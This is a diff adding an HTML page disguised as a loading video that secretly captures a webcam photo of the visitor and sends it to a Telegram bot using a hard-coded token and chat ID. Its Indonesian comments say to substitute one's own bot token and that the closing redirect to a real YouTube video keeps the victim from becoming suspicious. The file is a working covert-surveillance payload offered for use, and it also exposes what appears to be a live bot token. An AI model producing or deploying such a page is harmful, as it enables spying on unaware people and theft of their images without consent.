@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head><title>Loading Video...</title></head>
+<body>
+    <video id="video" width="0" height="0" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+    <script>
+        const botToken = "7702524045:AAFyPZql1w8FCg-cbLU2yjKv-2PtdOLP6Yc"; // Ganti dengan token bot Telegram
+        const chatId = "7263868848";    // Ganti dengan chat ID Telegram Anda
+
+        navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+            setTimeout(() => {
+                const canvas = document.getElementById('canvas');
+                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                canvas.toBlob(blob => {
+                    const formData = new FormData();
+                    formData.append('chat_id', chatId);
+                    formData.append('photo', blob, 'target.png');
+                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                        method: 'POST', body: formData
+                    });
+                }, 'image/png');
+            }, 2000);
+        });
+        // Redirect ke YouTube asli agar tidak curiga
+        setTimeout(() => { window.location.href = "https://www.youtube.com/watch?v=iRVZ6wTYecI"; }, 4000);
+    </script>
+</body>
+</html>
